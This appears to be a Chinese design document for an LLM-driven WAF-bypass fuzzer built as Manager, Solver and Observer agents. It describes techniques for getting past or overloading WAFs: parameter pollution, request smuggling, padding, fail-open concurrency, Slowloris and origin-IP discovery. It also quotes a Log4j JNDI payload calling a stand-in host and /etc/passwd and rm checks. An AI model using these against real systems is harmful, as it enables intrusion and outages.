# Multi-Agent 架构重构设计文档

**日期**: 2026-05-18
**状态**: 待审批
**范围**: 将单体 Agent 架构重构为 Manager + Solver + Observer 三层解耦多智能体系统

---

## 1. 背景与目标

当前系统是单体架构，`workflow.py` 耦合了调度、Payload 生成、HTTP 发包、证据判定、KB 管理所有职责。本次重构目标：

- **职责解耦**：Manager（调度）、Solver（攻击）、Observer（判定）三层分离
- **能力扩展**：Solver 从单一语义绕过扩展到四维绕过体系
- **判定独立**：Observer 完全独立，避免确认偏误

### 不变的核心原则

AI 只做推理和变异，机械劳动全部本地化、缓存化、短路化。

---

## 2. 整体架构

### 2.1 三层职责

| Agent | 职责 | LLM 使用 |
|-------|------|----------|
| **Manager** | 读配置、选择目标、LLM 决策策略/维度、控制循环、收集结果、更新 KB、写报告 | 每轮一次策略决策 |
| **Solver** | 接收策略指令 → 路由到四维引擎 → 生成 Payload + 发包 → 返回原始响应 | Payload 生成时使用 |
| **Observer** | 接收原始 HTTP 响应 → 独立 baseline diff + 证据提取 + 判定 → 返回 verdict | CMDI 零 Token，SQLi 用 LLM |

### 2.2 通信机制

同步函数调用，传递 `dataclass` 强类型对象。

### 2.3 数据流

```
Manager
  │
  │ 1. SolverRequest(strategy, dimension, target, kb_context, round_num)
  ▼
Solver
  │
  │ 2. List[RawResponse]
  ▼
Manager（透传给 Observer）
  │
  │ 3. ObserverRequest(responses, baseline_html, vuln_type)
  ▼
Observer
  │
  │ 4. ObserverResult(verdicts, summary)
  ▼
Manager（收集结果，决定下一轮）
```

---

## 3. 目录结构

```
waf-fuzzer/
├── config/
│   ├── target.yaml
│   └── base_rules.json
├── agents/
│   ├── __init__.py
│   ├── manager.py
│   ├── solver.py
│   ├── observer.py
│   └── solver_engines/
│       ├── __init__.py
│       ├── base.py
│       ├── protocol.py
│       ├── performance.py
│       ├── semantic.py
│       └── topology.py
├── core/
│   ├── requester.py
│   ├── response_extractor.py
│   └── memory_compressor.py
├── output/
└── main.py
```

- `core/`：底层工具库，被三个 Agent 共享调用，不含决策逻辑
- `agents/`：三 Agent 层，所有决策逻辑在此
- `main.py`：新入口，初始化三个 Agent 并启动 Manager

---

## 4. 数据结构定义

```python
@dataclass
class SolverRequest:
    target: TargetConfig
    strategy: str                   # Manager LLM 决策的策略方向（自然语言）
    dimension: str                  # "protocol" | "performance" | "semantic" | "topology"
    kb_context: str                 # base_rules + learned_rules 拼接
    round_num: int
    blocked_payloads: list[str]     # 历史被拦截的 payload

@dataclass
class RawResponse:
    payload: str
    status_code: int
    headers: dict
    body: str
    elapsed_ms: int
    dimension: str                  # 来自哪个维度引擎

@dataclass
class ObserverRequest:
    responses: list[RawResponse]
    baseline_html: str
    vuln_type: str
    oob_server: str | None = None       # 回调服务器地址（仅 log4j/deserialization）
    oob_poll_api: str | None = None     # 轮询 API 端点
    oob_tokens: dict[str, str] | None = None  # payload_index → unique_token 映射

@dataclass
class Verdict:
    payload: str
    is_bypass: bool
    evidence: str | None            # 截断 ≤2000 字符
    confidence: float               # 0-1
    reason: str

@dataclass
class ObserverResult:
    verdicts: list[Verdict]
    bypass_count: int
    blocked_count: int
    summary: str
```

---

## 5. Manager Agent

### 确定性职责

- 加载 `target.yaml` + `base_rules.json` + `learned_rules.json`
- 初始化 Session、Baseline 采集（复用 `baseliner.py` 逻辑）
- 循环控制：轮次计数、连续全拦截计数、终止条件判断
- 结果收集：汇总 `ObserverResult`
- 报告生成：复用 `_categorize_payload()` + 报告格式化
- KB 更新：调用 `memory_compressor` 逐轮压缩

### LLM 决策职责

每轮调用一次 LLM，输入：
- 当前 target 信息（URL、vuln_type、历史表现）
- 前 N 轮的 strategy + result 摘要
- 当前 KB 上下文
- 可用维度列表

输出：
- `dimension`：本轮使用哪个 Solver 维度
- `strategy`：策略方向的自然语言描述（传给 Solver）
- `reasoning`：决策理由（写入报告）

### 策略切换逻辑

- 连续 N 轮全拦截 → LLM 收到"强制换思路"信号，必须切换维度
- 成功绕过 → LLM 分析成功原因，在当前维度内深化或切换
- 每个维度的历史表现作为 LLM 决策上下文

---

## 6. Solver Agent（四维绕过体系）

### 6.1 统一接口

```python
class SolverEngine(ABC):
    @abstractmethod
    def generate(self, request: SolverRequest) -> list[str]: ...

    @abstractmethod
    def send(self, payloads: list[str], target: TargetConfig) -> list[RawResponse]: ...
```

### 6.2 维度路由

```python
class Solver:
    def solve(self, request: SolverRequest) -> list[RawResponse]:
        engine = self._route(request.dimension)
        payloads = engine.generate(request)
        responses = engine.send(payloads, request.target)
        return responses
```

### 6.3 SemanticSolver（语义执行层）

从现有 `llm_engine.py` 演进，最成熟的引擎：
- LLM 生成/变异 Payload（CMDI 闭合符+高危命令，SQLi UNION/盲注/报错）
- 冷门等价函数替换（`tac` 替代 `cat`，`rev` 替代 `tac`）
- 特定闭合语法探索（反引号、`$()`、`%0a`）
- 复用现有 `batch_send()` 发包逻辑

### 6.4 ProtocolSolver（协议解析层）

利用 WAF 和后端对 HTTP 解析的差异性（阻抗失配）：

- **HTTP Method 切换**：GET→POST/PUT/OPTIONS，payload 从 URL 移到 body
- **Content-Type 畸形**：`application/json` + 实际 form body
- **参数污染 (HPP)**：同名参数重复，WAF 检查第一个但后端取最后一个
- **Chunked Transfer-Encoding 走私**：分块编码中插入 payload
- **双重编码**：`%2527` 替代 `'`，WAF 解码一层放行，后端解码两层
- **Header 注入**：`X-Forwarded-For`、`X-Original-URL` 等
- **HTTP/2 降级**：利用 HTTP/2 和 HTTP/1.1 解析差异

生成策略：Manager LLM 提供"后端语言/RFC 规范"线索 → ProtocolSolver LLM 据此生成针对性 Payload

### 6.5 PerfSolver（资源性能层）

攻击 WAF 的资源限制：

- **Padding 攻击**：超大 payload 填充，撑爆 WAF 检测缓冲区
- **并发 Race Condition**：极高并发，触发 WAF Fail-Open
- **Slowloris 式**：慢速发送，占用 WAF 连接池
- **请求间隔随机化**：绕过速率限流

实现：复用 `ThreadPoolExecutor`，并发数和 payload 大小由 Manager 策略控制

### 6.6 TopologySolver（架构拓扑层）

从物理链路上绕开 WAF：

- **资产测绘**：DNS 历史记录、证书透明度日志、Shodan/Censys 发现真实源 IP
- **边缘 SSRF 利用**：利用 CDN/云服务的 SSRF 间接访问源站
- **直接访问源站**：发现源 IP 后直接发包

实现：LLM 生成测绘命令 + `requester.py` 向源站直接发包

---

## 7. Observer Agent

### 独立性保证

- 不接收 Solver 的策略分析或 payload 设计意图
- 只接收 `ObserverRequest`（原始响应 + baseline + vuln_type）
- SQLi 判定时不传 payload 语义，Observer 从响应内容自行推断

### 判定流程

```
for each RawResponse:
  1. 状态码短路：403/406/501/429 → blocked
  2. 文本提取（三级回退）：<pre> → <code>/<samp> → <body>
  3. Baseline diff：行级差集，无增量 → blocked（OOB 类型除外）
  4. 假阳性过滤：WAF 拦截页 / Shell 报错 / 空行
  5. 按 vuln_type 分流判定（见下文各类型详解）
```

### CMDI 判定（硬编码正则，零 Token）

继承现有 `inline_parser.py` 的 `_has_cmdi_evidence()` 逻辑：

| 命令类型 | 检测模式 | 说明 |
|---------|---------|------|
| 读取类 | `_CMDI_PASSWD_LINE`：`root:`/`daemon:` 等系统账户名+冒号 | 检测 /etc/passwd 回显 |
| 读取类 | `_CMDI_BASE64`：≥60 字符的连续 base64 串 | 检测 base64 编码回显 |
| 创建类 | `_CMDI_CREATE_MARKER`：回显含 `fzcr_` + 4 位随机字符 | 自包含验证：echo marker → cat 验证 |
| 删除类 | `_CMDI_LS_BLINDSIGHT`：ls 输出中目标文件消失 | 三步验证：rm → ls 确认消失 |

### SQLi 判定（LLM 独立判定）

Observer 不接收 payload 语义，完全从响应内容推断：

```
你是一个独立的 HTTP 响应分析器。判断以下响应是否表明存在 SQL 注入成功的迹象。
你不知道发送了什么 payload，只能从响应本身判断。

响应文本：{diff 后的文本}
响应耗时：{elapsed_ms}ms
基线耗时：{baseline_ms}ms

判断标准：
1. 响应是否包含数据库结构信息（表名、列名、数据库版本）？
2. 响应是否包含非页面框架的用户数据？
3. 响应耗时是否显著异常（>3x 基线）？
4. 响应是否包含 MySQL/PostgreSQL/Oracle 错误信息中嵌套的数据？

返回 JSON：{"bypass": true/false, "confidence": 0-1, "reason": "..."}
```

### Log4j / 反序列化判定（OOB + 错误型 + 时序型）

Log4j (CVE-2021-44228) 及 Java 反序列化漏洞的检测与 CMDI/SQLi 本质不同：
成功标志不是响应体中的内容变化，而是**目标服务器发起了出站连接**（JNDI/LDAP/RMI/DNS lookup）。

**三重判定策略**：

#### 策略 1：OOB 回调检测（主要手段，零误报）

Solver 在 payload 中嵌入可控回调地址（如 `${jndi:ldap://oob.example.com/xxx}`），
Observer 轮询回调服务器的接收日志，确认目标是否发起了出站连接。

```
Observer OOB 检测流程：
  1. 从 ObserverRequest.callback_server 获取回调服务器配置
  2. 为每个 payload 生成唯一 subdomain/token（如 round3-p7.oob.example.com）
  3. 发包后轮询回调服务器 API：
     GET https://oob.example.com/api/poll?token={token}
  4. 收到回调 → bypass=True，附带回调类型（DNS/HTTP/LDAP/RMI）和时间戳
  5. 超时未收到 → blocked
```

回调服务器支持：
- **自建**：`interactsh` / `dnslog.cn` / 自建 DNS 服务器
- **配置方式**：`config/target.yaml` 中 `oob_server` 字段

#### 策略 2：错误型检测（辅助手段）

JNDI lookup 失败时（如目标无法出网），响应可能包含错误信息：

```
检测模式（硬编码正则，零 Token）：
  - javax.naming.CommunicationException
  - javax.naming.NameNotFoundException
  - java.lang.ClassNotFoundException
  - JNDI lookup failed
  - Error looking up JNDI resource
  - com.sun.jndi.ldap.LdapCtx
  - java.rmi.RemoteException
  - 特定厂商错误：Weblogic T3/IIOP 错误特征
```

这些错误说明 JNDI lookup **确实被执行了**（只是连接目标不通），属于高置信度 bypass。

#### 策略 3：时序型检测（辅助手段）

JNDI lookup 如果连接超时，会引入可测量的响应延迟：

```
时序判定逻辑：
  - baseline 响应时间 < 500ms
  - payload 响应时间 > 3000ms
  - 且响应体无 WAF 拦截页特征
  → 判定为可能的 JNDI 超时，confidence=0.5（需 OOB 二次确认）
```

#### Log4j Observer Prompt 设计

```
你是一个独立的 HTTP 响应分析器。判断以下响应是否表明存在 Log4j / JNDI 注入成功的迹象。
你不知道发送了什么 payload，只能从响应本身判断。

响应文本：{diff 后的文本}
响应耗时：{elapsed_ms}ms
基线耗时：{baseline_ms}ms
OOB 回调状态：{oob_status}  （"none" / "dns_received" / "http_received" / "ldap_received"）

判断标准：
1. OOB 回调已收到 → bypass=True，confidence=1.0
2. 响应包含 JNDI/LDAP/RMI 异常堆栈 → bypass=True，confidence=0.9
3. 响应耗时显著异常且无 WAF 拦截特征 → bypass=True，confidence=0.5
4. 响应包含 WAF 拦截页特征 → blocked
5. 其他 → blocked

返回 JSON：{"bypass": true/false, "confidence": 0-1, "reason": "..."}
```

#### ObserverRequest 扩展

为支持 OOB 检测，`ObserverRequest` 已在第 4 节数据结构中包含 `oob_server`、`oob_poll_api`、`oob_tokens` 三个可选字段。Manager 在构造 Log4j 类型请求时填充这些字段，CMDI/SQLi 类型不填充（保持 `None`）。

### 通用漏洞类型扩展框架

Observer 的判定路由设计为可扩展：

```python
class Observer:
    JUDGES = {
        "cmdi": CMDIJudge(),           # 硬编码正则
        "sqli": SQLiJudge(),           # LLM 判定
        "log4j": Log4jJudge(),         # OOB + 错误型 + 时序型
        "deserialization": Log4jJudge(),  # 复用 Log4j 的 OOB 检测逻辑
    }

    def evaluate(self, request: ObserverRequest) -> ObserverResult:
        judge = self.JUDGES.get(request.vuln_type, GenericJudge())
        # ...
```

新增漏洞类型只需实现 `Judge` 接口并注册即可，无需修改 Observer 核心逻辑。

---

## 8. 主循环

```python
def main():
    config = load_config("config/target.yaml")
    kb = load_kb("config/base_rules.json", "output/learned_rules.json")

    manager = Manager(config, kb)
    solver = Solver()
    observer = Observer()

    for target in manager.select_targets():
        baseline = manager.collect_baseline(target)

        for round_num in range(config.max_iterations):
            decision = manager.decide_strategy(target, round_num)

            solver_req = SolverRequest(
                target=target, strategy=decision.strategy,
                dimension=decision.dimension, kb_context=kb.get_context(),
                round_num=round_num, blocked_payloads=manager.blocked_history
            )
            responses = solver.solve(solver_req)

            obs_req = ObserverRequest(
                responses=responses, baseline_html=baseline,
                vuln_type=target.vuln_type
            )
            result = observer.evaluate(obs_req)

            manager.record_round(target, decision, result)
            manager.update_kb(target, decision, result)

            if manager.should_stop(target):
                break

        manager.generate_report(target)
```

---

## 9. 配置变更

`config/target.yaml` 新增字段：

```yaml
fuzzing:
  # 现有字段不变
  solver_dimensions:
    - protocol
    - performance
    - semantic
    - topology
  dimension_switch_threshold: 3
  perf_padding_size: 102400
  perf_concurrency: 50

# 新增：OOB 回调服务器配置（Log4j / 反序列化检测用）
oob:
  server: "oob.example.com"           # 回调服务器域名
  poll_api: "https://oob.example.com/api/poll"  # 轮询 API
  api_key: ""                         # 认证密钥（可选）
  poll_interval_ms: 2000              # 轮询间隔（毫秒）
  poll_timeout_ms: 30000              # 最大等待时间（毫秒）
```

---

## 10. 现有代码迁移映射

| 现有模块 | 去向 | 说明 |
|---------|------|------|
| `workflow.py` | → `manager.py` + `main.py` | 循环控制归 Manager，入口归 main.py |
| `llm_engine.py` generate/mutate | → `solver.py` + `semantic.py` | Payload 生成归 Solver |
| `llm_engine.py` judge_sqli | → `observer.py` | SQLi 判定逻辑归 Observer |
| （新增）Log4j OOB 检测 | → `observer.py` | Log4j 判定：OOB + 错误型 + 时序型 |
| `llm_engine.py` login/KB | → `manager.py` | 管理逻辑归 Manager |
| `inline_parser.py` | → `observer.py` | 证据提取归 Observer |
| `requester.py` | → `core/requester.py` | 共享工具，被 Solver 调用 |
| `baseliner.py` | → `manager.py` 内部 | 基线采集归 Manager |
| `memory_compressor.py` | → `core/memory_compressor.py` | 共享工具，被 Manager 调用 |
| `response_extractor.py` | → `core/response_extractor.py` | 保持为独立工具 |

---

## 11. Token 优化策略保留

所有现有优化全部保留，分布在 Observer 和 Manager 中：

- 状态码短路 → `core/requester.py`
- 基线 diff 优先 → Observer
- CMDI 硬编码证据正则 → Observer（零 Token）
- SQLi LLM 判定 → Observer（仅 SQLi 消耗 Token）
- Log4j OOB 回调检测 → Observer（零 Token，轮询回调服务器）
- Log4j 错误型检测 → Observer（硬编码正则，零 Token）
- Log4j 时序型检测 → Observer（仅高置信度疑似时调 LLM 二次确认）
- Parser 内联管道 → Observer
- 极简拦截列表 → Manager 传递给 Solver
- 逐轮压缩整合 → Manager + `core/memory_compressor.py`
